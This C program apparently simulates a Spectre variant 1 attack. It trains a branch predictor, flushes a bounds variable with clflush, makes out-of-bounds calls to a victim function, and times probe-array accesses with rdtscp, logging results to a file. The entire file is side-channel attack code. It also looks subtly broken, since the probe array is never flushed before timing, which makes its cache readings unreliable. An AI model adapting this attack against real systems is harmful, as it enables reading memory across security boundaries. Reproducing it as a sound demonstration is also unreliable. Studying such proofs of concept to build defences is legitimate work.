#include <stdio.h>
#include <stdint.h>
#include <x86intrin.h>  // For rdtscp and clflush
#include <stdlib.h>

#define CACHE_HIT_THRESHOLD 80  // Threshold to distinguish cache hits from misses

unsigned int array1_size = 16;                 // Size of array1
uint8_t array1[16], array2[256 * 512];        // Arrays used for the attack
uint8_t temp = 0;                              // Temporary variable for speculative access
FILE *log_file;                                // Log file pointer

// Victim function vulnerable to speculative execution
void victim_function(size_t x) {
    if (x < array1_size) {
        // Accessing the array which is vulnerable to speculation
        uint8_t accessed_value = array1[x]; // Get the accessed value for logging
        temp &= array2[accessed_value * 512];  // This line is vulnerable to speculative execution
        fprintf(log_file, "Victim function accessed array1[%zu]: %u\n", x, accessed_value);
    } else {
        fprintf(log_file, "Victim function: Invalid access with x = %zu\n", x);
    }
}

// Flushing the memory location from the cache
void flush_cache(uint8_t *addr) {
    _mm_clflush(addr);  // Flushing the cache line
    fprintf(log_file, "Flushed address: %p\n", addr);
}

// Measuring access time to determine cache hits/misses
unsigned int measure_access_time(uint8_t *addr) {
    unsigned int time1, time2;
    uint64_t start, end;

    start = __rdtscp(&time1);  // Starting timing
    temp = *addr;              // Accessing the memory (this may be a cache hit or miss)
    end = __rdtscp(&time2);    // Ending timing

    unsigned int access_time = (unsigned int)(end - start);  // Calculate access time
    fprintf(log_file, "Measured access time for address %p: %u cycles (time1: %u, time2: %u)\n", addr, access_time, time1, time2);
    return access_time;  // Returning the access time
}

// Simulating a Spectre attack
void spectre_attack(size_t malicious_x) {
    flush_cache((uint8_t *)&array1_size);  // Flushing the boundary check from the cache
    for (volatile int i = 0; i < 100; i++) {}  // Delay for speculative execution

    // Executing the victim function with the malicious input
    fprintf(log_file, "Executing victim function with malicious_x = %zu\n", malicious_x);
    victim_function(malicious_x);
}

int main() {
    // Open log file for writing
    log_file = fopen("spec_trace.txt", "w");
    if (!log_file) {
        perror("Failed to open log file");
        return EXIT_FAILURE;
    }

    // Initialize array1 with values
    for (size_t i = 0; i < array1_size; i++) {
        array1[i] = i;  // Fill array1 with values from 0 to 15
    }

    // Training the branch predictor with valid accesses
    fprintf(log_file, "Training branch predictor with valid accesses.\n");
    for (int i = 0; i < 1000; i++) {
        victim_function(0);  // Valid access to train the branch predictor
    }

    // Performing multiple Spectre attacks with different malicious inputs
    fprintf(log_file, "Performing multiple Spectre attacks:\n");
    for (size_t i = 0; i < 100; i++) {
        size_t malicious_x = 16 + i;  // Generating out-of-bounds access for testing
        fprintf(log_file, "Performing Spectre attack with malicious_x = %zu\n", malicious_x);
        spectre_attack(malicious_x);
    }

    // Measuring cache hits/misses
    fprintf(log_file, "Measuring cache hits/misses:\n");
    for (int i = 0; i < 256; i++) {
        size_t addr = (size_t)&array2[i * 512];  // Get the address of the element in array2
        unsigned int access_time = measure_access_time((uint8_t *)addr);  // Measure access time

        // Log cache status
        if (access_time <= CACHE_HIT_THRESHOLD) {
            fprintf(log_file, "Data at array2[%d * 512] is in cache! Time: %u cycles\n", i, access_time);
        } else {
            fprintf(log_file, "Data at array2[%d * 512] is not in cache. Time: %u cycles\n", i, access_time);
        }
    }

    // Close log file
    fclose(log_file);
    return 0;
}








